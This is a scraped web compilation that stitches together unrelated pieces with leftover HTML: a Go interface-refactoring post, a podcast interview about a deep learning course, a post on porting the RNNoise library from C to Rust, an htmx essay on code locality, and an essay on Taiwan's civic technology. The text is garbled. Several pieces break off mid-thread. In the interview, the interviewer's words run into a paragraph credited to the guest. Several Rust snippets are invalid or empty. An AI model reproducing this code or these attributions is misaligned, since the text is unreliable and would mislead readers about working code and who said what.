Q: If I have two shoes in a box, put a pencil in the box, and
remove one shoe, what is left?
A: A shoe.

Q: If I put a pencil in a box, then put another pencil in the box,
what is in the box?
A: Two pencils.

Q: Then if …</code></pre></div></div></article></div></div></div></div>

It is also about changes that improve the code’s readability and help the development team stay happy. The object of this post is an <strong>interface</strong> that helps a program communicate with a database.</p><p id="b6c4"><strong>Disclaimer:</strong> If we would use various <a href="https://github.com/avelino/awesome-go#orm" target="_blank" rel="noopener">ORMs</a> such as <a href="https://gorm.io/" target="_blank" rel="noopener">Gorm</a> in this project, most probably we would not face this issue, yet, we decided to write our implementation, so this created the issue and therefore this post.</p><figure><div></div></figure><p id="1329">The problem with this interface was its size — 130+ methods in one single interface! That’s a lot of methods and that is not what <a href="https://medium.com/better-programming/solid-principles-simple-and-easy-explanation-f57d86c47a7f" target="_blank" rel="noopener">SOLID</a> interface should look like. And since we develop in Go, we have to know (and follow) one of <a href="https://go-proverbs.github.io/" target="_blank" rel="noopener">the Go proverbs</a> which are:</p><blockquote><p id="9c7d">The bigger the interface, the weaker the abstraction. © Rob Pike</p></blockquote><p id="f4c6">The further we developed the project, the heavier this interface grew and soon it became clear that to continue the development with fewer bugs, less time spent understanding the code, and more comfort, this interface should be refactored. We as a team could not use this interface with flexibility. We could not tell from the first glance what it does since it does everything. And that forced me to start its refactoring. Which is what I want to share with you.</p><h2 id="e6c7">Step 0: Cover Code (API) with Tests before any Refactoring</h2><p id="2c76">This is crucial, since dealing with interfaces, abstractions, and refactoring without tests that cover API logic makes no good. I would say that it can do exactly opposite — bring a lot of problems to your code since every change you make to the interface will result in 20+ files being changed. And if you do not have solid tests, there is a high chance you break something or create bugs. Please, be cautious!</p><h2 id="ced3">Step 1: Imagine What the Result Would Look Like</h2><p id="e957">I decided to concentrate on common aggregates that my project deals with. After some time of thinking and looking through the entire list of functions, I outlined how the future interface would look like and this is what I came up with:</p><figure><div></div></figure><p id="f6e9">This would allow writing the following code instead of just reference one of 130+ methods from the interface:</p><pre><span id="f196">user, err := api.Storage.GetUserByID(ctx, userID)<br>err := api.Storage.DenyAgreement(ctx, agreement)<br>err := api.Storage.UpdateUserDeviceToken(ctx, model.UserDeviceToken{...})</span></pre><p id="cc47">After refactoring:</p><pre><span id="c108">user, err := api.Storage.User().Get(ctx, userID)<br>err := api.Storage.Agreement().Deny(ctx, agreement)<br>err := api.Storage.User().UpdateDeviceToken(ctx, model.UserDeviceToken{...})</span></pre><p id="c182">As you can see, this interface consists of multiple smaller interfaces each based on certain aggregates (users, agreements, etc.) and doing something with that aggregate. Reading such constructions is a much better experience and at the same time, it is more convenient since if you ever need to do anything with a user, you know where to search for the right methods and consider if they even exist.</p><h2 id="f63e">Step 2: Implement Changes Step by Step</h2><p id="8b19">Having interface with 130+ methods makes it very complicated to do refactor in “once and for all” style. There are so many changes that turn every merge request into 50+ files changes. So, the next step, therefore, should be breaking the interface step by step, one aggregate after another and committing those changes often to make small, understandable merge request and making sure everything still works as expected (remember step 0!) For this I first break down methods into small portions</p><figure><div></div></figure><p id="2e5d">So, I created several sub-interfaces and stated that my IStorage interface implements them all. That did not change the code much but laid an important preparatory brick to what I wanted to do next, which is essentially replace my sub-interfaces with separate interfaces with their separate methods in <a href="https://www.codecademy.com/articles/what-is-crud" target="_blank" rel="noopener">CRUD</a> fashion, adding missing methods &amp; uniting those which are of the same nature. I added new structs as the implementation of those interfaces and replaced old methods with a new one with VSCode search &amp; replace all features.</p><figure><div></div></figure><p id="2046">As a result, I have changed all IStorage sub-interfaces to its interfaces and made all functions more intuitive &amp; understandable. Yes, it took me a while to do that, yet, the result is worth it.</p><h2 id="78f3">Step 3: Clean up</h2><p id="4971">Bulk edits with find -&gt; replace all helps save time, but it also creates some side effects where you can rename not relevant function or the logs messages might get a bit silly and hard to understand. This what happened to me after refactoring.</p><figure><div></div></figure><p id="4636">When this gets logged we get the message “Update failed” which might not be so clear to us at first glance. Yes, there is a “handler” param that indicates where exactly it happened, but this might not be enough to determine the exact spot. So, my advice here would be to go ahead and review the project’s log messages and other components that might get affected by the refactoring.</p><h2 id="df86">Side Effects from Refactoring</h2><p id="92b6">During this process, it became clear that we use a lot of different methods for the same thing (like updating items in various fields in various methods). This creates code smell and in the future, we would avoid that anti-pattern.</p><p id="fbfa">Also, I have found some functions that were not “fit” in certain places. For example when agreements were highly dependent on referrals in the update. That made no sense after I begin refactoring. Having this “God” interface allowed code to use it, but refactoring showed how terrible it was and made living with this code impossible. I have to re-write some functions to create more natural, intuitive functionality.</p><p id="aae1">Yes, we have to write some more code, yet, this approach gives us way more to code’s readability, maintainability, and simple design. I would do it after all.</p><h2 id="0d9e">Conclusion</h2><p id="014e">If you have a project with a very heavy database interface and you see that it continues to grow, consider refactoring as soon as possible since it would just get worse.</p><p id="3ff0">When refactoring, always check tests first, then decide what the end solution should look like and do partial updates, one component at a time. This will keep your project alive, will decrease chances of introducing new bugs, will keep code reviewers from anger, and keep you happy about the progress.</p><p id="6671">After refactoring large interfaces always check for ‘side effects”. basically<br>If you ever face the same issue, please share your solutions in the comments, since I am really curious about what else I might have done. Also, please share your thoughts on what I could (and still can) do to make it even better. Any feedback is more than welcomed!</p></div></div></section></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Josh Tobin is a researcher working at the intersection of machine learning and robotics. His research focuses on applying deep reinforcement learning, generative models, and synthetic data to problems in robotic perception and control.<br></p><div><p>Additionally, he co-organizes a machine learning training program for engineers to learn about production-ready deep learning called <a href="https://fullstackdeeplearning.com/">Full Stack Deep Learning</a>.<a href="https://fullstackdeeplearning.com/"> </a>Josh did his PhD in Computer Science at UC Berkeley advised by Pieter Abbeel and was a research scientist at OpenAI for 3 years during his PhD.

Follow Josh on <a href="https://twitter.com/josh_tobin">twitter</a> and on his <a href="http://josh-tobin.com/">website.</a></p></div><p><strong>Lukas: </strong>I think for a lot of people listening to this, just knowing our demographics, I think a lot of people would probably be most interested in learning about machine learning and they might even know you from some of the classes that you teach which I think, in my opinion, are some of the best classes out there. I've learned a lot from watching you teach and I'm curious how did you get the idea of teaching a class? How did that come up?</p><p><strong>Josh: </strong>It sort of all started to happen around two years ago. I was working at Open AI at the time and Open AI was going through an interesting transition, I would say. When I first joined, it really felt like a very traditional academic lab. It felt like the lab that I was at at Berkeley, except with more resources. And, you know, at some point they figured out that there was a type of work that they were uniquely suited to do that a typical academic lab is not well suited to do, which is this sort of larger projects that involve instead of just a couple of researchers working together, maybe a team of twelve or fifteen folks, you know, a mix of engineers and researchers with bigger budgets, more ambitious goals and really, really trying to push out these projects that would clearly mark a move forward in the state of the field. And so while this is happening, a big part of that change was we needed to figure out how we are going to professionalize our process of building machine learning models, right? And so on the robotics team, which I was working on at the time, we were figuring out stuff like how do we write good tests for machine learning code? So that you don't lose the ability to train a model that you were able to train a couple months ago, which happened to us multiple times. I actually manage a team that has both folks that are doing speculative research stuff that may not be able to really measure their progress in any given week and also people who are doing very traditional engineering work. That is, where you can easily say this is the goal for this week and have we met that goal? So, we were trying to sort out all these things. And around the time I was talking to my PhD advisor at Berkeley, Pieter Abbeel, and a friend of ours, Sergey Karayev, who was running at the time, a machine learning for an education company called GradeScope, and we were swapping notes on how we were approaching these things and how Pieter had seen other companies approach these and how Sergey had approached some of the stuff of GradeScope. We realized that there is this whole emerging engineering discipline I will call it, around, you can go online and learn the math and the algorithms behind machine learning; you can learn what neural network is; you can even really learn how to use TensorFlow and how to code this stuff up in an effective way, but at the time, there was very little on everything else that you need in order to actually make this stuff work in the real world. So, you know, not only the things I described, but also, how do you troubleshoot models? How do you choose projects? How do you manage teams? How do you deploy things into production? How do you monitor them once they're in production? And so we realized that everyone that we knew was reinventing the wheel on all of these practices and the number of people that are actually good at this is very small and they have to be tracked in a small handful of large technology companies in the Bay Area, let's say. So we just thought it will be really good for the field if we wrote down everything that we knew about the stuff and everything that our friends knew about it. And so that was the genesis of the Full Stack Deep Learning class. I guess what's amazing, I hadn't really thought about it this way but I feel like I spent my career and I'm a little older than you, studying, making machine learning models work in the real world. But watching your class, I'm learning a ton and I'm seeing you as the expert. How did you get up to speed on this stuff so fast? Was it just the experience at Open AI, because your classes are amazingly deep?</p><p><strong>Josh: </strong>Yeah, it's a good question. I mean, I think I was at Open AI at the most interesting point for this, because we were figuring this stuff out from first principles. And so there are tons of conversations around what tests should we have for machine learning models? And it was a really brilliant group of people there who would like to take a problem and break it apart and look at it from the ground up. And so I think I was able to like look at things from, all the way down to the first principle's level through that and then I think it was really just about trying to talk to a lot of the folks that are working in the field and seeing how they approached some of these things as well. A lot of the content we put together in that class came from about thirty or forty interviews that we did with practitioners and just trying to understand. We had a good sense of, what are the hard things? And what questions do you need to ask if you're putting together an applied machine learning team. So just getting a range of answers on those was also really helpful.</p><p><strong>Lukas:</strong> You know, you have a unique background, having been like a McKinsey Consultant for a number of years. Do you think that informs you at all like that? Do you think about how that might affect the way you approach this stuff?</p><p><strong>Josh: </strong>I think one of the things I learned from McKinsey was, how do you approach abstract problems? Like what should our company do? Or, you know, what does your organization structure look like? Show like these problems where it's like okay, where do I even start thinking about this problem? I think the question like how to make machine learning work in the real world has this flavor and then figuring out how to break that down into parts and structure your thinking around it is definitely one of the essential things that you have to do as a management consultant. And so I think that definitely informed the way that I looked at this problem.</p><p><strong>Lukas: </strong>So is there a piece of your curriculum that you feel particularly proud of?</p><p><strong>Josh: </strong>I think the thing that I put the most, emotional energy into was the troubleshooting guide.</p><p><strong>Lukas: </strong>That is actually my favorite part too.</p><p><strong>Josh: </strong>That was the piece that I would say I was writing it for myself a few years ago more than anything else, because I was just trying to answer.. to... My perspective when I was writing that was, "how could I have saved myself months of time if I had gone and started over in this field?"</p><p><strong>Lukas: </strong>I would have to say that I got a chance to work for you briefly for maybe a month or two and I think my big takeaway from you that I always hear in my head is you are like, "You should always slow down and change one thing at a time." I mean, I feel like that actually applies to more than machine learning obviously. But boy, does it apply to machine learning like Oh my God!</p><p><strong>Josh: </strong>Yeah. It's so essential in machine learning, because fundamentally I think the thing that makes machine learning so hard is that, when you're writing software, like when you're writing code, we have this pretty mature ecosystem where if you make a mistake, usually the system that you're building or that you're interacting with will tell you. First of all, will tell you that you made a mistake. And second of all, might even give you a hint as to where that mistake is. But the insane thing about actually trying to make progress on machine learning projects is that most of the time when you have a bug, the only thing that happens is that the performance of your model doesn't get better as quickly as it should. And so there's no way of knowing that you actually made a mistake a lot of time. Unless you happen to have really strong intuition about what your learning curve should look like, right? And so I feel like that's why it's so essential to move slowly when you're building your machine learning models.</p><p><strong>Lukas: </strong>Although it's kind of funny because I wonder if programming Web applications is the outlier here, because I think about just trying to make an advertising campaign work well or trying to get my old motorcycle running again, it's always better to change one thing. Yeah. Because it's so hard to tell what will happen otherwise. But I guess maybe we have this better telemetry or API, you know, programming python or if I don't know...</p><p><strong>Josh: </strong>I feel like that's right. I mean, I wouldn't consider myself a world class web developer, but when I've done it, it's also been helpful to still just change one thing at a time.</p><p><strong>Lukas: </strong>I just feel like it's just good advice for all situations.</p><p><strong>Josh: </strong>Yeah, it might be. Anytime you're building anything, I feel like as you get better at something you can increase the increment of what you can change at a time. For example, if I'm training an image classifier or something, I can pretty much just start with newer architecture, like a resonant or something like that, because I've done that enough times that I know what I can expect the result will look like if it works and what common things that can go wrong are. So I feel like I can skip a couple of steps but when I'm writing Kubernetes Code, right? Something I'm not very much good at, I have to still move very, very slowly.</p><p><strong>Lukas: </strong>Would you be down to walk me …</p></div></div>

    <time datetime="2020-07-12T00:00:00+00:00">July 12, 2020</time>
  </header>
<p>I ported a C library to rust last week, and it went pretty smoothly. This is
the story, and <a href="https://github.com/jneem/nnnoiseless">here</a> is the repo.</p>

<p>The library in question is <a href="https://github.com/xiph/rnnoise">RNNoise</a>, a
library for removing noise from audio. It works well, it runs fast, and best of
all it has no knobs that you need to tune. There’s even a <a href="https://github.com/RustAudio/rnnoise-c">rust
binding</a>.</p>

<p>So why bother porting it?
Well, I need to patch it so that it would compile with MSVC, but my PR went
unnoticed for a month. I thought about maintaining my own fork, but it’s been
more than 10 years since I last wrote anything in C or C++.
And that’s how I ended up porting RNNoise to rust. It probably wasn’t the most
efficient use of my time, but I had fun and learned something.</p>

<p>There’s a lot of information out there about porting C to rust, but the most
useful resource for me was the fantastic
<a href="https://github.com/carols10cents/rust-out-your-c-talk">talk</a> by Carol (Nichols
|| Goulding). It lays out a simple process for porting one function
at a time: first, you set up the cargo to compile as a static library and you
set up the C build system to link that static library into the C library
(see the slides for the relevant Makefile and Cargo.toml snippets).
Then you can port one function at time: the C code goes like this:</p>

<div><div><pre><code><span>+</span><span>extern</span> <span>void</span> <span>_celt_lpc</span><span>(</span><span>opus_val16</span> <span>*</span><span>_lpc</span><span>,</span> <span>const</span> <span>opus_val32</span> <span>*</span><span>ac</span><span>,</span> <span>int</span> <span>p</span><span>);</span>
<span>+</span><span>void</span> <span>__celt_lpc</span><span>(</span><span>opus_val16</span> <span>*</span><span>_lpc</span><span>,</span> <span>const</span> <span>opus_val32</span> <span>*</span><span>ac</span><span>,</span> <span>int</span> <span>p</span><span>)</span>
<span>-</span><span>void</span> <span>_celt_lpc</span><span>(</span><span>opus_val16</span> <span>*</span><span>_lpc</span><span>,</span> <span>const</span> <span>opus_val32</span> <span>*</span><span>ac</span><span>,</span> <span>int</span> <span>p</span><span>)</span>
<span>{</span>
    <span>/* C body of _celt_lpc */</span>
<span>}</span>
</code></pre></div></div>

<p>and the rust code goes like this:</p>

<div><div><pre><code><span>+</span><span>#[no_mangle]</span>
<span>+</span><span>pub</span> <span>extern</span> <span>"C"</span> <span>fn</span> <span>_</span><span>celt_lpc</span><span>(</span><span>lpc</span><span>:</span> <span>*</span><span>mut</span> <span>f32</span><span>,</span> <span>ac</span><span>:</span> <span>*</span><span>const</span> <span>f32</span><span>,</span> <span>p</span><span>:</span> <span>c_int</span><span>)</span> <span>{</span>
<span>+</span>    <span>unsafe</span> <span>{</span>
<span>+</span>        <span>let</span> <span>lpc_slice</span> <span>=</span> <span>std</span><span>::</span><span>slice</span><span>::</span><span>from_raw_parts_mut</span><span>(</span><span>lpc</span><span>,</span> <span>p</span> <span>as</span> <span>usize</span><span>);</span>
<span>+</span>        <span>let</span> <span>ac_slice</span> <span>=</span> <span>std</span><span>::</span><span>slice</span><span>::</span><span>from_raw_parts</span><span>(</span><span>ac</span><span>,</span> <span>p</span> <span>as</span> <span>usize</span> <span>+</span> <span>1</span><span>);</span>
<span>+</span>        <span>rs_celt_lpc</span><span>(</span><span>lpc_slice</span><span>,</span> <span>ac_slice</span><span>);</span>
<span>+</span>    <span>}</span>
<span>+</span><span>}</span>
<span>+</span>
<span>+</span><span>fn</span> <span>rs_celt_lpc</span><span>(</span><span>lpc</span><span>:</span> <span>&amp;</span><span>mut</span> <span>[</span><span>f32</span><span>],</span> <span>ac</span><span>:</span> <span>&amp;</span><span>[</span><span>f32</span><span>])</span> <span>{</span>
<span>+</span><span>// rust body of celt_lpc</span>
<span>+</span><span>}</span>
</code></pre></div></div>

<p>If you’ve watched the talk (which you should), you might notice that this is a
tiny bit different from what they recommend: I’ve renamed the original C
function instead of deleting it. I found that this helped me narrow down porting
mistakes, because it made it easy to switch back and forth between the C and
rust implementations.</p>



<p>Most of the porting process was mechanical and easy. One of the less fun parts was
porting code involving C structs. RNNoise has structs that (when ported to
rust) look like this:</p>

<div><div><pre><code><span>#[repr(C)]</span>
<span>struct</span> <span>RnnState</span> <span>{</span>
    <span>model</span><span>:</span> <span>*</span><span>const</span> <span>RnnModel</span><span>,</span>
    <span>// Various buffers, whose sizes are determined by some subfields of `model`.</span>
    <span>vad_gru_state</span><span>:</span> <span>*</span><span>mut</span> <span>f32</span><span>,</span>
    <span>noise_gru_state</span><span>:</span> <span>*</span><span>mut</span> <span>f32</span><span>,</span>
    <span>denoise_gru_state</span><span>:</span> <span>*</span><span>mut</span> <span>f32</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p>An idomatic rust version might look something like</p>
<div><div><pre><code><span>struct</span> <span>RnnState</span> <span>{</span>
    <span>model</span><span>:</span> <span>&amp;</span><span>'static</span> <span>RnnModel</span><span>,</span>

<p>but this isn’t layout-compatible with the original C version, and so I need to
stick with the original struct for as long as <code>RnnState</code> is being accessed by
both C and rust code. This increases the amount of <code>unsafe</code> sprinkled around
the rust code, and it was also the source of an annoying bug of the sort that I
thought I had left behind by moving to rust.</p>



<p>At some point during the porting process, my tests started failing in release mode,
but not in debug mode. Most likely some undefined behavior triggered by my amateurish
attempts at unsafe code, but I couldn’t quickly spot the problem and the prospect of
a more careful round of debugging didn’t spark a whole lot of joy. So I did something
that I never would have dared to do in my C/C++ days: I ignored the problem and kept
porting; after all, the tests were still working in debug mode. And sure enough,
a few more ported functions later and <code>rustc</code> found the problem for me: in a function
taking a <code>&amp;RnnState</code> parameter, I was modifying data in the <code>vad_gru_state</code> buffer.
Since I was using unsafe code, <code>rustc</code> didn’t complain at first. But once I ported
the <code>RnnState</code> struct to safe and idiomatic rust, the compiler flagged the problem
immediately.</p>



<p>After getting everything to 100% safe (if not particulary idiomatic) rust, it was time
to check whether performance had suffered.</p>

<p><img src="https://jneem.github.io/images/ported_benchmark.svg" alt="initial benchmark"></p>

<p>Yes, apparently, by about 50%. The most obvious culprit was bounds checking: there was
a lot of indexing in the C code, and some of it wasn’t trivial to convert to a more
rust-friendly, iterator-based version. First priority was the neural network evaluation:</p>

<div><div><pre><code><span>let</span> <span>m</span> <span>=</span> <span>...</span><span>;</span> <span>// At most 114.</span>
<span>let</span> <span>n</span> <span>=</span> <span>...</span><span>;</span> <span>// At most 96.</span>

<span>for</span> <span>i</span> <span>in</span> <span>0</span><span>..</span><span>n</span> <span>{</span>
    <span>let</span> <span>output</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>layer</span><span>.bias</span><span>[</span><span>i</span><span>]</span> <span>as</span> <span>f32</span><span>;</span>
    <span>for</span> <span>j</span> <span>in</span> <span>0</span><span>..</span><span>m</span> <span>{</span>
        <span>output</span><span>[</span><span>i</span><span>]</span> <span>+=</span> <span>layer</span><span>.input_weights</span><span>[</span><span>j</span> <span>*</span> <span>n</span> <span>+</span> <span>i</span><span>]</span> <span>as</span> <span>f32</span> <span>*</span> <span>input</span><span>[</span><span>j</span><span>];</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>I can already see you shaking your head. I’m doing naive matrix-vector multiplication
with a 100x100ish matrix in
<a href="https://en.wikipedia.org/wiki/Row-_and_column-major_order">column-major format</a>?
Not only is this costing me bounds checks, it’s terrible for memory locality.
Swapping the weights storage from column- to row-major order only made things
about 1.5% faster, but more importantly it made the whole thing iterator-friendly.
Converting to zips and sums bought another 15%, leaving me only about 25-30% slower
than the C code.</p>

            <span>.sum</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>For my next optimization opportunity, I moved on to the function
that
computes <a href="https://en.wikipedia.org/wiki/Cross-correlation">cross-correlations</a>.
The un-optimized version of this function looks like</p>

<div><div><pre><code><span>fn</span> <span>pitch_xcorr</span><span>(</span><span>xs</span><span>:</span> <span>&amp;</span><span>[</span><span>f32</span><span>],</span> <span>ys</span><span>:</span> <span>&amp;</span><span>[</span><span>f32</span><span>],</span> <span>xcorr</span><span>:</span> <span>&amp;</span><span>mut</span> <span>[</span><span>f32</span><span>])</span> <span>{</span>
    <span>for</span> <span>i</span> <span>in</span> <span>0</span><span>..</span><span>xcorr</span><span>.len</span><span>()</span> <span>{</span>
        <span>xcorr</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>xs</span><span>.iter</span><span>()</span><span>.zip</span><span>(</span><span>&amp;</span><span>ys</span><span>[</span><span>i</span><span>..</span><span>])</span><span>.map</span><span>(|(</span><span>&amp;</span><span>x</span><span>,</span> <span>&amp;</span><span>y</span><span>)|</span> <span>x</span> <span>*</span> <span>y</span><span>)</span><span>.sum</span><span>();</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>but the C code contained a massive, manually-unrolled version. I’d skipped
it while porting, but maybe I’d gain something from porting it over. Here’s
an abbreviated version of the optimized function, assuming that all
lengths are a multiple of 4 (the real code also handles the case that they aren’t).</p>

<p>Basically, both inner and outer loops have been unrolled four times, and I’ve
exploited the inner loop’s unrolling to optimize the memory access pattern.
Thanks to the amazing <a href="https://github.com/gnzlbg/cargo-asm"><code>cargo asm</code></a>, I
can happily report that there’s no bounds-checking in the inner loop and that
all the arithmetic has been <a href="https://en.wikipedia.org/wiki/Automatic_vectorization">auto-vectorized</a>
to work four <code>f32</code>s at a time. (Maybe it would get even faster if I unrolled 8 times and
compiled with AVX enabled; I haven’t tried that yet.)</p>

<p>This change more than doubled the speed of <code>pitch_xcorr</code>, and gained me about 10% overall.
More importantly, it showed me how to coerce the compiler into auto-vectorizing something
that it hadn’t auto-vectorized before. I went back to the neural network code and
replaced things like</p>

<div><div><pre><code><span>xs</span><span>.iter</span><span>()</span><span>.zip</span><span>(</span><span>ys</span><span>)</span><span>.map</span><span>(|(</span><span>&amp;</span><span>x</span><span>,</span> <span>&amp;</span><span>y</span><span>)|</span> <span>x</span> <span>as</span> <span>f32</span> <span>*</span> <span>y</span><span>)</span><span>.sum</span><span>()</span>
</code></pre></div></div>

<p>with things like</p>

<div><div><pre><code><span>{</span>

<span>}</span>
</code></pre></div></div>

<p>for another 20% improvement.</p>

<p>Current score: the rust version (still 100% safe) is about 15% faster, and there’s probably plenty more
still on the table.</p>

<p><img src="https://jneem.github.io/images/ported_benchmark_after.svg" alt="final benchmark"></p>

<p>The performance lesson I learned from this is that bounds checking can be expensive in numerical code
and iterator-style code can help a bit, but if you really want faster numerical code then you need
to write in a style that the auto-vectorizer likes. (Or you could use the <a href="https://doc.rust-lang.org/core/arch/index.html">SIMD intrinsics</a>
directly, but that’s another story.)</p>



<p>Like I wrote above, it’s been a while since I did any C/C++, and because of that I’ve started to take tools
like cargo for granted. This little porting project brought back some memories, mostly because about half of the
code in RNNoise was actually “vendored” from <a href="https://gitlab.xiph.org/xiph/opus">opus</a>. I put “vendored”
in quotes because I usually think of vendoring as involving a subdirectory (maybe even a git submodule if
I’m lucky) with its own build artifacts. That’s not what’s going on here, though; I’m just talking about files
that were copied from the source directory of one project to the source directory of another, complete with
never-used functions and never-def’ed ifdefs. The thing is, though, that I understand exactly why they did it:
it’s by far the easiest way to share code between C projects. So I just want to finish by saying a big “thank you”
to <code>cargo</code> and <code>crates.io</code> for making me not have to deal with C dependency management any more.</p>

    <h2>Locality of Behaviour (LoB)</h2>
<blockquote>
<p>"The primary feature for easy maintenance is locality: Locality is that characteristic of source code that enables a
programmer to understand that source by looking at only a small portion of it." -- <a href="https://www.dreamsongs.com/Files/PatternsOfSoftware.pdf">Richard Gabriel</a></p>
</blockquote>
<h3>The LoB Principle:</h3>
<blockquote>
<p>The behaviour of a code unit should be as obvious as possible by looking only at that unit of code</p>
</blockquote>
<h3>Discussion</h3>
<p>The LoB principle is a simple prescriptive formulation of the quoted statement from <a href="https://www.dreamsongs.com/">Richard Gabriel</a>.
In as much as it is possible, and in balance with other concerns, developers should strive to make the behaviour of
a code element obvious on inspection.</p>
<p>Consider two different implementations of an AJAX request in HTML, the first in <a href="https://htmx.org/">htmx</a>:</p>
<pre><code>&lt;div hx-get="/clicked"&gt;Click Me&lt;/div&gt;
</code></pre>
<p>and the second in <a href="https://jquery.com/">jQuery</a>:</p>
<pre><code>  $("#d1").on("click", function(){
    $.ajax({
         ...
    });
  });
</code></pre>
<pre><code>&lt;div id="d1"&gt;Click Me&lt;/div&gt;
</code></pre>
<p>In the former, the behaviour of the <code>div</code> element is obvious on inspection, satisfying the LoB principle.</p>
<p>In the latter, the behaviour of the <code>div</code> element is spread out amongst multiple files.  It is difficult to know
exactly what the div does without a total knowledge of the code base.</p>
<h4>Surfacing Behaviour vs. Inlining Implementation</h4>
<p>A common conflation is surfacing behaviour with inlining implementation of that behaviour.  These are separate concepts
and, while inlining the implementation of a behaviour isn't <em>always</em> incorrect, it may <em>often</em> be incorrect.</p>
<p>Increasing the obviousness of the behaviour of an element is, ceteris paribus, a good thing, but it falls to both end-developers
and especially framework developers to make LoB as easy as possible.</p>
<h4>Conflict With Other Development Principles</h4>
<p>The LoB will often conflict with other software development principles.  Two important ones
are:</p>
<ul>
<li>
<p><a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">DRY - Don't Repeat Yourself</a></p>
<p>Software developers typically strive to avoid redundancy in their code or data.  This as come to be called "Staying DRY",
i.e. Don't Repeat Yourself.  Like other software design principles this, on its own, is a good thing.  htmx, for example,
allows you to place many attributes on parent elements in a DOM and avoid repeating these attributes on children.  This is a
violation of LoB, in favor of DRY, and such tradeoffs need to be made judiciously by developers.</p>
<p>Note that the further behaviour gets from the code unit it effects, the more severe the violation of LoB.  If it is
within a few lines of the code unit, this is less serious than if it is a page away, which is less serious than if
it is in a separate file entirely.</p>
<p>There is no hard and fast rule, but rather subjective tradeoffs that must be made as software developers.</p>
</li>
<li>
<p><a href="https://en.wikipedia.org/wiki/Separation_of_concerns">SoC - Separation Of Concerns</a></p>
<p>Separation of concerns a design principle for separating a computer program into distinct sections such that each
section addresses a separate concern.  A canonical example of this is CSS vs. Javascript.  Again, on its own and
in isolation this may, indeed, be a good thing.  Inlining styles has become more prevalent lately, but there are
still strong arguments in favor of SoC in this regard.</p>
<p>Note that SoC is, however, in conflict with LoB.  By tweaking a CSS file the look and, to an extent, behaviour of an
element can change dramatically, and it is not obvious where this dramatic change came from.  Tools help to an extent
here, but there is still "spooky action at a distance" going on.</p>
<p>Again, this isn't to condemn SoC wholesale, just to say that there are subjective tradeoffs that must be made when
considering how to structure your code.  The fact that inline styles have become more prevalent as of late is an
indication that SoC is losing some support amongst developers.</p>
</li>
</ul>
<h4>Conclusion</h4>
<p>LoB is a software design principle that can help make a code bases more humane and maintainable.  It must be traded
off against other design principles and be considered in terms of the limitations of the system a code unit is
written in, but, as much as is it is practical, adherence to this principle will increase your developer productivity
and well-being.</p>

<p>When the pandemic hit Western liberal democracies, it found countries in need of profound institutional reform. For the past 14 years, democratic frameworks have been <a href="https://freedomhouse.org/report/freedom-world/2020/leaderless-struggle-democracy">weakening and receding</a>, with many countries experiencing an erosion of individual rights and civil liberties. It was in this context that the coronavirus erupted and within a few weeks, every aspect of reality was transformed, with core democratic expressions like voting or protesting becoming a potential threat to public health. </p>



<p>The combined forces of democratic crisis and COVID-19 have presented the world with a historic opportunity to profoundly rethink the way governments operate. The inertia of the status quo — a major obstacle for those trying to innovate — suddenly lost its implacable force, and we became more compelled than ever to think of alternatives.</p>



<p>It’s about time. Despite the internet transforming every aspect of how we live, somehow our political institutions have remained mostly unaltered by the past two decades of advances in information technology. A representative democracy with elections held every few years is a system designed in the 19th century and based on 15th-century information technology, the printing press. This was a great model for a time when communication was done through paper and ink, but it falls short in addressing the needs of our highly interconnected societies.</p>

<p>Looking at the global democratic recession and possible connective tissues behind country-specific circumstances, the effects of technological disruption emerge everywhere. Jobs are being automated and work is becoming more precarious — and adding chaos and confusion to the widening gap between those who benefit from globalization and those excluded from it is social media that further polarizes constituencies and enables (by design) campaigns of psychological manipulation.</p>



<p>Thus, in navigating our way forward, it is imperative that we understand how technology can serve humanity — all of humanity, not just a small elite.</p>



<p>Getting to this point necessarily involves creating paths for a plurality of voices and perspectives to emerge. But what should a democracy look like in the internet era? One of the obstacles that hampers our ability to move forward is that imagining positive narratives around technology is a challenge in and of itself. Most of our science fiction is dystopic. And with few exceptions, these cautionary tales have served well to avert us from effectively employing technology-enabled coordination solutions in our governments. Luckily, there are a few real-world examples that can point the direction, revealing the extraordinary possibilities that emerge when digital connection is employed for improving governance.</p>



<h5><strong>#TaiwanCanHelp</strong></h5>



<p>Over the past few months, Taiwan has provided a prominent example of the power and effectiveness of online participatory practices in addressing the coronavirus crisis. Taiwanese democracy was born concomitantly with the internet, a historical coincidence that helped it develop perhaps the strongest civic technology ecosystem in the world. Citizens are technologically savvy and engaged. The government is cooperative and responsive.</p>



<p>Taiwanese public health officials learned about coronavirus in December 2019 through a <a href="https://www.scmp.com/abacus/tech/article/3080309/how-reddit-forum-helped-taiwan-prepare-early-covid-19">Reddit-like forum</a>, and took the potential danger seriously enough to start <a href="https://jamanetwork.com/journals/jama/fullarticle/2762689">assessing</a> travelers arriving from mainland China. Needless to say, it paid off. At the outset of the pandemic, the Taiwanese government <a href="https://www.foreignaffairs.com/articles/asia/2020-03-20/how-civic-technology-can-help-stop-pandemic">leveraged</a> the collective intelligence of the country’s residents to propose, vote, design and implement a series of applications that helped them accurately map the spread of contagion and manage the supply of masks around the country. Abundant and precise information, voluntarily shared by citizens, enabled a set of surgical responses that avoided a state-wide lockdown and economic freeze.</p>



<p>Taiwanese democracy is not restricted to electing representatives every few years. It’s a continuous <a href="https://www.economist.com/open-future/2019/03/12/inside-taiwans-new-digital-democracy">exercise</a> of broad social coordination supported by digital connection. Feedback loops with the population are dynamic, and institutional responses are prompt. A platform called <a href="https://www.technologyreview.com/2018/08/21/240284/the-simple-but-ingenious-system-taiwan-uses-to-crowdsource-its-laws/">vTaiwan</a> is continuously employed to surface citizen-led proposals and allow people to debate political measures, helping the country legislate with the collaboration of its constituents. When Uber arrived in Taiwan, for example, thousands of participants helped build a consensus on how to regulate the company and its drivers and workers.</p>

